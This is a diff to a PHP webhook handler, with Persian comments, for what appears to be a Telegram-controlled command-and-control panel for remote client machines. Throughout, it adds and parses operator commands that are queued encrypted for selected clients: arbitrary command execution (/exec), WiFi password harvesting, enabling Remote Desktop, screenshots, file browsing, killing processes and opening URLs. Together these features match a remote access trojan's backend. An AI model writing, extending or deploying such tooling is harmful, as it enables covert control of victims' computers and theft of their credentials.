@@ -1,4 +1,5 @@
 <?php
+
 namespace Handlers;
 
 use Services\LoggerService;
@@ -105,7 +106,7 @@ class WebhookHandler
         if ($selectedClient) {
             $commandType = $this->parseCommandType($text);
             $params = $this->parseCommandParams($text);
-            
+
             if ($commandType) {
                 $this->processCommand($commandType, $params, $selectedClient, $chatId);
                 $this->logger->logWebhook("Command queued: $commandType");
@@ -117,6 +118,7 @@ class WebhookHandler
         }
     }
 
+    // در تابع parseCommandType، بخش commandMap را آپدیت کنید:
     private function parseCommandType(string $text): ?string
     {
         $commandMap = [
@@ -128,12 +130,12 @@ class WebhookHandler
             '/sleep' => 'system_command',
             '/signout' => 'system_command',
             '/browse' => 'file_operation',
-            '/get-info' => 'system_info',
-            '/tasks' => 'process_management',
-            '/end_task' => 'end_task',
-            '/enable_rdp' => 'enable_rdp',
-            '/disable_rdp' => 'disable_rdp',
-            '/getwifipasswords' => 'get_wifi_passwords',
+            '/get-info' => 'system_info',          // ✅ اضافه شد
+            '/tasks' => 'process_management',      // ✅ اضافه شد
+            '/end_task' => 'end_task',             // ✅ اضافه شد
+            '/enable_rdp' => 'enable_rdp',         // ✅ اضافه شد
+            '/disable_rdp' => 'disable_rdp',       // ✅ اضافه شد
+            '/getwifipasswords' => 'get_wifi_passwords', // ✅ اضافه شد
         ];
 
         foreach ($commandMap as $cmd => $type) {
@@ -149,22 +151,57 @@ class WebhookHandler
     {
         $params = [];
 
+        // دستور /exec - اجرای دستور سیستم
         if (preg_match('/^\/exec\s+(.+)$/', $text, $matches)) {
             $params['command'] = trim($matches[1]);
             return $params;
         }
 
+        // دستور /browse - مرور فایل‌ها
         if (preg_match('/^\/browse\s+(.+)$/', $text, $matches)) {
             $params['action'] = 'list';
             $params['path'] = trim($matches[1]);
             return $params;
         }
 
+        // دستور /end_task - پایان دادن به تسک
         if (preg_match('/^\/end_task\s+(.+)$/', $text, $matches)) {
             $params['process_name'] = trim($matches[1]);
             return $params;
         }
 
+        // دستور /go - باز کردن URL
+        if (preg_match('/^\/go\s+(.+)$/', $text, $matches)) {
+            $params['url'] = trim($matches[1]);
+            return $params;
+        }
+
+        // دستور /tasks - لیست فرآیندها
+        if (str_starts_with($text, '/tasks')) {
+            $params['action'] = 'list';
+        }
+
+        // دستور /get-info - اطلاعات سیستم
+        if (str_starts_with($text, '/get-info')) {
+            $params['action'] = 'full';
+        }
+
+        // دستور /getwifipasswords - دریافت پسوردهای WiFi
+        if (str_starts_with($text, '/getwifipasswords')) {
+            $params['action'] = 'all';
+        }
+
+        // دستور /enable_rdp - فعال‌سازی RDP
+        if (str_starts_with($text, '/enable_rdp')) {
+            $params['action'] = 'enable';
+        }
+
+        // دستور /disable_rdp - غیرفعال‌سازی RDP
+        if (str_starts_with($text, '/disable_rdp')) {
+            $params['action'] = 'disable';
+        }
+
+        // دستورات مدیریت سیستم
         if (str_starts_with($text, '/shutdown')) {
             $params['command'] = 'shutdown';
         } elseif (str_starts_with($text, '/restart')) {
@@ -175,8 +212,14 @@ class WebhookHandler
             $params['command'] = 'signout';
         }
 
-        if (str_starts_with($text, '/tasks')) {
-            $params['action'] = 'list';
+        // دستور /status - وضعیت سیستم
+        if (str_starts_with($text, '/status')) {
+            $params['action'] = 'check';
+        }
+
+        // دستور /screenshot - گرفتن عکس از صفحه
+        if (str_starts_with($text, '/screenshot')) {
+            $params['action'] = 'capture';
         }
 
         return $params;
@@ -189,18 +232,18 @@ class WebhookHandler
                 'type' => $commandType,
                 'params' => $params
             ];
-            
+
             $encryptedCommand = $this->encryption->encrypt(json_encode($commandData));
-            
+
             $stmt = $this->pdo->prepare(
                 "INSERT INTO client_commands (client_id, command, status, created_at) 
                 VALUES (?, ?, 'pending', NOW())"
             );
             $stmt->execute([$clientId, $encryptedCommand]);
-            
+
             $this->telegram->sendPlainMessage($chatId, "✅ Command '$commandType' queued for client $clientId.");
             $this->logger->logWebhook("Command queued: $commandType for client: $clientId");
-            
+
             return ['status' => 'success'];
         } catch (\PDOException $e) {
             $this->logger->logError("Failed to queue command: " . $e->getMessage());
@@ -212,7 +255,7 @@ class WebhookHandler
     private function sendClientKeyboard(string $chatId)
     {
         $clients = $this->getClientStatus();
-        
+
         if (empty($clients)) {
             $this->telegram->sendPlainMessage($chatId, "No clients registered.\n\nPlease ensure clients are connected.\nUse /select <client_id> to select directly.");
             $this->logger->logError("No clients found for keyboard");
@@ -221,26 +264,26 @@ class WebhookHandler
 
         $keyboard = ['inline_keyboard' => []];
         $row = [];
-        
+
         foreach ($clients as $client) {
             $status = $client['is_online'] ? '🟢' : '🔴';
             $ip = $client['ip_address'] ?? 'Unknown';
             $clientId = $client['client_id'];
-            
+
             // ساده‌سازی متن دکمه برای جلوگیری از خطای parse
             $buttonText = "$status $clientId ($ip)";
-            
+
             $row[] = [
                 'text' => $buttonText,
                 'callback_data' => "select_client:$clientId"
             ];
-            
+
             if (count($row) == 2) {
                 $keyboard['inline_keyboard'][] = $row;
                 $row = [];
             }
         }
-        
+
         if ($row) {
             $keyboard['inline_keyboard'][] = $row;
         }
@@ -272,19 +315,19 @@ class WebhookHandler
 
         $keyboard = ['inline_keyboard' => []];
         $row = [];
-        
+
         foreach ($commands as $cmd => $label) {
             $row[] = [
                 'text' => $label,
                 'callback_data' => "command:$cmd"
             ];
-            
+
             if (count($row) == 2) {
                 $keyboard['inline_keyboard'][] = $row;
                 $row = [];
             }
         }
-        
+
         if ($row) {
             $keyboard['inline_keyboard'][] = $row;
         }
@@ -296,7 +339,7 @@ class WebhookHandler
     {
         try {
             $onlineThreshold = date('Y-m-d H:i:s', time() - \Config::$ONLINE_THRESHOLD);
-            
+
             $stmt = $this->pdo->prepare(
                 "SELECT client_id, ip_address, 
                 IF(last_seen > ?, 1, 0) as is_online,
@@ -306,7 +349,7 @@ class WebhookHandler
             );
             $stmt->execute([$onlineThreshold]);
             $clients = $stmt->fetchAll();
-            
+
             $this->logger->logWebhook("Found " . count($clients) . " clients");
             return $clients;
         } catch (\PDOException $e) {
